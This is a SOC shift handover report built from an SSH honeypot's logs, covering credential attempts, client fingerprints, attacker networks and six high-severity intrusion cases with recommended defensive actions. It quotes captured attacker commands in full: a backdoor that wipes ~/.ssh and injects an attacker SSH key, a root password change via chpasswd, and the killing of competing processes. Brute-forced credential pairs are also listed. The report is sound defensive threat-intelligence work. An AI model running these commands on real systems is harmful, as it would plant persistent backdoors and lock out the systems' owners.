# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-20 |
| **Generated At** | 2026-04-20T17:09:10Z |
| **Shift Time** | 17:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **56** |
| Confirmed Threats | **47** |
| False Positives Filtered | **9** (16.1%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **5** |
| High Severity Cases | **6** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **12** |
| Unique Credential Pairs | **12** |
| Unique Usernames | **7** |
| Unique Passwords | **12** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 6 |
| `claude` | 1 |
| `a` | 1 |
| `345gs5662d34` | 1 |
| `jenny` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Claude!123` | 1 |
| `a` | 1 |
| `Root654321!@#` | 1 |
| `a1234567090` | 1 |
| `2026.` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `claude` | `Claude!123` | 1 |
| `a` | `a` | 1 |
| `root` | `Root654321!@#` | 1 |
| `root` | `a1234567090` | 1 |
| `root` | `2026.` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Root654321!@#` | `101.126.54.36` | 2026-04-20T15:53:00 |
| `root` | `a1234567090` | `101.126.54.36` | 2026-04-20T15:53:47 |
| `root` | `2026.` | `101.126.54.36` | 2026-04-20T15:55:31 |
| `root` | `123456sX` | `201.76.120.30` | 2026-04-20T15:59:39 |
| `root` | `3245gs5662d34` | `201.76.120.30` | 2026-04-20T15:59:47 |
| `root` | `---fuck_you----` | `113.44.214.138` | 2026-04-20T16:18:43 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **56** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 39 |
| OpenSSH | 2 |
| Unknown | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 30 | 8 |
| `c118de82e19e...` | Mirai/variant | 2 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 30 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 9 | 5 | — |
| `c118de82e19e...` | OpenSSH | 2 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ddH9OvVlIRMN"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.54.36`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `201.76.120.30`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **14** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS17638` | ASN for TIANJIN Provincial Net of CT | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5f67cc19c708

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]36` |
| **First Seen** | 2026-04-20 15:52 |
| **Last Seen** | 2026-04-20 15:53 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ddH9OvVlIRMN"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 15:52:59` | `cowrie.session.connect` |
| `2026-04-20 15:52:59` | `cowrie.client.version` |
| `2026-04-20 15:53:00` | `cowrie.client.kex` |
| `2026-04-20 15:53:00` | `cowrie.login.success` |
| `2026-04-20 15:53:01` | `cowrie.session.params` |
| `2026-04-20 15:53:01` | `cowrie.command.input` |
| `2026-04-20 15:53:01` | `cowrie.command.failed` |
| `2026-04-20 15:53:01` | `cowrie.log.closed` |
| `2026-04-20 15:53:01` | `cowrie.session.params` |
| `2026-04-20 15:53:01` | `cowrie.command.input` |
| `2026-04-20 15:53:01` | `cowrie.session.file_download` |
| `2026-04-20 15:53:01` | `cowrie.log.closed` |
| `2026-04-20 15:53:14` | `cowrie.session.params` |
| `2026-04-20 15:53:14` | `cowrie.command.input` |
| `2026-04-20 15:53:14` | `cowrie.log.closed` |
| `2026-04-20 15:53:14` | `cowrie.session.params` |
| `2026-04-20 15:53:14` | `cowrie.command.input` |
| `2026-04-20 15:53:15` | `cowrie.log.closed` |
| `2026-04-20 15:53:15` | `cowrie.session.params` |
| `2026-04-20 15:53:15` | `cowrie.command.input` |
| `2026-04-20 15:53:15` | `cowrie.session.file_download` |
| `2026-04-20 15:53:15` | `cowrie.log.closed` |
| `2026-04-20 15:53:16` | `cowrie.session.params` |
| `2026-04-20 15:53:16` | `cowrie.command.input` |
| `2026-04-20 15:53:16` | `cowrie.log.closed` |
| `2026-04-20 15:53:16` | `cowrie.session.params` |
| `2026-04-20 15:53:16` | `cowrie.command.input` |
| `2026-04-20 15:53:16` | `cowrie.log.closed` |
| `2026-04-20 15:53:17` | `cowrie.session.params` |
| `2026-04-20 15:53:17` | `cowrie.command.input` |
| `2026-04-20 15:53:17` | `cowrie.command.input` |
| `2026-04-20 15:53:17` | `cowrie.log.closed` |
| `2026-04-20 15:53:17` | `cowrie.session.params` |
| `2026-04-20 15:53:17` | `cowrie.command.input` |
| `2026-04-20 15:53:18` | `cowrie.log.closed` |
| `2026-04-20 15:53:18` | `cowrie.session.params` |
| `2026-04-20 15:53:18` | `cowrie.command.input` |
| `2026-04-20 15:53:18` | `cowrie.log.closed` |
| `2026-04-20 15:53:19` | `cowrie.session.params` |
| `2026-04-20 15:53:19` | `cowrie.command.input` |
| `2026-04-20 15:53:19` | `cowrie.log.closed` |
| `2026-04-20 15:53:20` | `cowrie.session.params` |
| `2026-04-20 15:53:20` | `cowrie.command.input` |
| `2026-04-20 15:53:20` | `cowrie.log.closed` |
| `2026-04-20 15:53:20` | `cowrie.session.params` |
| `2026-04-20 15:53:20` | `cowrie.command.input` |
| `2026-04-20 15:53:20` | `cowrie.log.closed` |
| `2026-04-20 15:53:21` | `cowrie.session.params` |
| `2026-04-20 15:53:21` | `cowrie.command.input` |
| `2026-04-20 15:53:21` | `cowrie.log.closed` |
| `2026-04-20 15:53:21` | `cowrie.session.params` |
| `2026-04-20 15:53:21` | `cowrie.command.input` |
| `2026-04-20 15:53:22` | `cowrie.log.closed` |
| `2026-04-20 15:53:22` | `cowrie.session.params` |
| `2026-04-20 15:53:22` | `cowrie.command.input` |
| `2026-04-20 15:53:22` | `cowrie.log.closed` |
| `2026-04-20 15:53:23` | `cowrie.session.params` |
| `2026-04-20 15:53:23` | `cowrie.command.input` |
| `2026-04-20 15:53:23` | `cowrie.log.closed` |
| `2026-04-20 15:53:24` | `cowrie.session.params` |
| `2026-04-20 15:53:24` | `cowrie.command.input` |
| `2026-04-20 15:53:24` | `cowrie.log.closed` |
| `2026-04-20 15:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bcf081fb636

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]36` |
| **First Seen** | 2026-04-20 15:53 |
| **Last Seen** | 2026-04-20 15:54 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:j8QRbKey3M4p"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 15:53:45` | `cowrie.session.connect` |
| `2026-04-20 15:53:45` | `cowrie.client.version` |
| `2026-04-20 15:53:46` | `cowrie.client.kex` |
| `2026-04-20 15:53:47` | `cowrie.login.success` |
| `2026-04-20 15:53:48` | `cowrie.session.params` |
| `2026-04-20 15:53:48` | `cowrie.command.input` |
| `2026-04-20 15:53:48` | `cowrie.command.failed` |
| `2026-04-20 15:53:48` | `cowrie.log.closed` |
| `2026-04-20 15:53:48` | `cowrie.session.params` |
| `2026-04-20 15:53:48` | `cowrie.command.input` |
| `2026-04-20 15:53:48` | `cowrie.session.file_download` |
| `2026-04-20 15:53:48` | `cowrie.log.closed` |
| `2026-04-20 15:54:01` | `cowrie.session.params` |
| `2026-04-20 15:54:01` | `cowrie.command.input` |
| `2026-04-20 15:54:01` | `cowrie.log.closed` |
| `2026-04-20 15:54:01` | `cowrie.session.params` |
| `2026-04-20 15:54:01` | `cowrie.command.input` |
| `2026-04-20 15:54:01` | `cowrie.log.closed` |
| `2026-04-20 15:54:02` | `cowrie.session.params` |
| `2026-04-20 15:54:02` | `cowrie.command.input` |
| `2026-04-20 15:54:02` | `cowrie.session.file_download` |
| `2026-04-20 15:54:02` | `cowrie.log.closed` |
| `2026-04-20 15:54:02` | `cowrie.session.params` |
| `2026-04-20 15:54:02` | `cowrie.command.input` |
| `2026-04-20 15:54:02` | `cowrie.log.closed` |
| `2026-04-20 15:54:03` | `cowrie.session.params` |
| `2026-04-20 15:54:03` | `cowrie.command.input` |
| `2026-04-20 15:54:03` | `cowrie.log.closed` |
| `2026-04-20 15:54:03` | `cowrie.session.params` |
| `2026-04-20 15:54:03` | `cowrie.command.input` |
| `2026-04-20 15:54:03` | `cowrie.command.input` |
| `2026-04-20 15:54:04` | `cowrie.log.closed` |
| `2026-04-20 15:54:04` | `cowrie.session.params` |
| `2026-04-20 15:54:04` | `cowrie.command.input` |
| `2026-04-20 15:54:04` | `cowrie.log.closed` |
| `2026-04-20 15:54:04` | `cowrie.session.params` |
| `2026-04-20 15:54:04` | `cowrie.command.input` |
| `2026-04-20 15:54:05` | `cowrie.log.closed` |
| `2026-04-20 15:54:05` | `cowrie.session.params` |
| `2026-04-20 15:54:05` | `cowrie.command.input` |
| `2026-04-20 15:54:05` | `cowrie.log.closed` |
| `2026-04-20 15:54:06` | `cowrie.session.params` |
| `2026-04-20 15:54:06` | `cowrie.command.input` |
| `2026-04-20 15:54:06` | `cowrie.log.closed` |
| `2026-04-20 15:54:06` | `cowrie.session.params` |
| `2026-04-20 15:54:06` | `cowrie.command.input` |
| `2026-04-20 15:54:06` | `cowrie.log.closed` |
| `2026-04-20 15:54:07` | `cowrie.session.params` |
| `2026-04-20 15:54:07` | `cowrie.command.input` |
| `2026-04-20 15:54:07` | `cowrie.log.closed` |
| `2026-04-20 15:54:08` | `cowrie.session.params` |
| `2026-04-20 15:54:08` | `cowrie.command.input` |
| `2026-04-20 15:54:09` | `cowrie.log.closed` |
| `2026-04-20 15:54:10` | `cowrie.session.params` |
| `2026-04-20 15:54:10` | `cowrie.command.input` |
| `2026-04-20 15:54:10` | `cowrie.log.closed` |
| `2026-04-20 15:54:10` | `cowrie.session.params` |
| `2026-04-20 15:54:10` | `cowrie.command.input` |
| `2026-04-20 15:54:11` | `cowrie.log.closed` |
| `2026-04-20 15:54:11` | `cowrie.session.params` |
| `2026-04-20 15:54:11` | `cowrie.command.input` |
| `2026-04-20 15:54:11` | `cowrie.log.closed` |
| `2026-04-20 15:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-056f35e21509

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]36` |
| **First Seen** | 2026-04-20 15:55 |
| **Last Seen** | 2026-04-20 15:55 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:m1vG48udQWNm"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 15:55:31` | `cowrie.session.connect` |
| `2026-04-20 15:55:31` | `cowrie.client.version` |
| `2026-04-20 15:55:31` | `cowrie.client.kex` |
| `2026-04-20 15:55:31` | `cowrie.login.success` |
| `2026-04-20 15:55:32` | `cowrie.session.params` |
| `2026-04-20 15:55:32` | `cowrie.command.input` |
| `2026-04-20 15:55:32` | `cowrie.command.failed` |
| `2026-04-20 15:55:32` | `cowrie.log.closed` |
| `2026-04-20 15:55:33` | `cowrie.session.params` |
| `2026-04-20 15:55:33` | `cowrie.command.input` |
| `2026-04-20 15:55:33` | `cowrie.session.file_download` |
| `2026-04-20 15:55:33` | `cowrie.log.closed` |
| `2026-04-20 15:55:46` | `cowrie.session.params` |
| `2026-04-20 15:55:46` | `cowrie.command.input` |
| `2026-04-20 15:55:46` | `cowrie.log.closed` |
| `2026-04-20 15:55:47` | `cowrie.session.params` |
| `2026-04-20 15:55:47` | `cowrie.command.input` |
| `2026-04-20 15:55:47` | `cowrie.log.closed` |
| `2026-04-20 15:55:47` | `cowrie.session.params` |
| `2026-04-20 15:55:47` | `cowrie.command.input` |
| `2026-04-20 15:55:47` | `cowrie.session.file_download` |
| `2026-04-20 15:55:47` | `cowrie.log.closed` |
| `2026-04-20 15:55:48` | `cowrie.session.params` |
| `2026-04-20 15:55:48` | `cowrie.command.input` |
| `2026-04-20 15:55:48` | `cowrie.log.closed` |
| `2026-04-20 15:55:48` | `cowrie.session.params` |
| `2026-04-20 15:55:48` | `cowrie.command.input` |
| `2026-04-20 15:55:48` | `cowrie.log.closed` |
| `2026-04-20 15:55:49` | `cowrie.session.params` |
| `2026-04-20 15:55:49` | `cowrie.command.input` |
| `2026-04-20 15:55:49` | `cowrie.command.input` |
| `2026-04-20 15:55:49` | `cowrie.log.closed` |
| `2026-04-20 15:55:49` | `cowrie.session.params` |
| `2026-04-20 15:55:49` | `cowrie.command.input` |
| `2026-04-20 15:55:50` | `cowrie.log.closed` |
| `2026-04-20 15:55:50` | `cowrie.session.params` |
| `2026-04-20 15:55:50` | `cowrie.command.input` |
| `2026-04-20 15:55:50` | `cowrie.log.closed` |
| `2026-04-20 15:55:50` | `cowrie.session.params` |
| `2026-04-20 15:55:50` | `cowrie.command.input` |
| `2026-04-20 15:55:51` | `cowrie.log.closed` |
| `2026-04-20 15:55:51` | `cowrie.session.params` |
| `2026-04-20 15:55:51` | `cowrie.command.input` |
| `2026-04-20 15:55:52` | `cowrie.log.closed` |
| `2026-04-20 15:55:52` | `cowrie.session.params` |
| `2026-04-20 15:55:52` | `cowrie.command.input` |
| `2026-04-20 15:55:52` | `cowrie.log.closed` |
| `2026-04-20 15:55:52` | `cowrie.session.params` |
| `2026-04-20 15:55:52` | `cowrie.command.input` |
| `2026-04-20 15:55:53` | `cowrie.log.closed` |
| `2026-04-20 15:55:53` | `cowrie.session.params` |
| `2026-04-20 15:55:53` | `cowrie.command.input` |
| `2026-04-20 15:55:53` | `cowrie.log.closed` |
| `2026-04-20 15:55:54` | `cowrie.session.params` |
| `2026-04-20 15:55:54` | `cowrie.command.input` |
| `2026-04-20 15:55:54` | `cowrie.log.closed` |
| `2026-04-20 15:55:54` | `cowrie.session.params` |
| `2026-04-20 15:55:54` | `cowrie.command.input` |
| `2026-04-20 15:55:54` | `cowrie.log.closed` |
| `2026-04-20 15:55:55` | `cowrie.session.params` |
| `2026-04-20 15:55:55` | `cowrie.command.input` |
| `2026-04-20 15:55:55` | `cowrie.log.closed` |
| `2026-04-20 15:55:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1998711e233e

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-04-20 15:59 |
| **Last Seen** | 2026-04-20 15:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 15:59:38` | `cowrie.session.connect` |
| `2026-04-20 15:59:38` | `cowrie.client.version` |
| `2026-04-20 15:59:38` | `cowrie.client.kex` |
| `2026-04-20 15:59:39` | `cowrie.login.success` |
| `2026-04-20 15:59:40` | `cowrie.session.params` |
| `2026-04-20 15:59:40` | `cowrie.command.input` |
| `2026-04-20 15:59:40` | `cowrie.command.failed` |
| `2026-04-20 15:59:41` | `cowrie.log.closed` |
| `2026-04-20 15:59:41` | `cowrie.session.params` |
| `2026-04-20 15:59:41` | `cowrie.command.input` |
| `2026-04-20 15:59:42` | `cowrie.session.file_download` |
| `2026-04-20 15:59:42` | `cowrie.log.closed` |
| `2026-04-20 15:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eed91381b6f

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-04-20 15:59 |
| **Last Seen** | 2026-04-20 15:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 15:59:46` | `cowrie.session.connect` |
| `2026-04-20 15:59:46` | `cowrie.client.version` |
| `2026-04-20 15:59:46` | `cowrie.client.kex` |
| `2026-04-20 15:59:47` | `cowrie.login.success` |
| `2026-04-20 15:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-981a102be487

| Field | Detail |
|---|---|
| **Source IP** | `113.44.214[.]138` |
| **First Seen** | 2026-04-20 16:18 |
| **Last Seen** | 2026-04-20 16:18 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 16:18:13` | `cowrie.session.connect` |
| `2026-04-20 16:18:14` | `cowrie.client.version` |
| `2026-04-20 16:18:14` | `cowrie.client.kex` |
| `2026-04-20 16:18:43` | `cowrie.login.success` |
| `2026-04-20 16:18:45` | `cowrie.session.params` |
| `2026-04-20 16:18:45` | `cowrie.command.input` |
| `2026-04-20 16:18:45` | `cowrie.log.closed` |
| `2026-04-20 16:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.44.214[.]138` to AbuseIPDB if not already reported
- [ ] Block `113.44.214[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

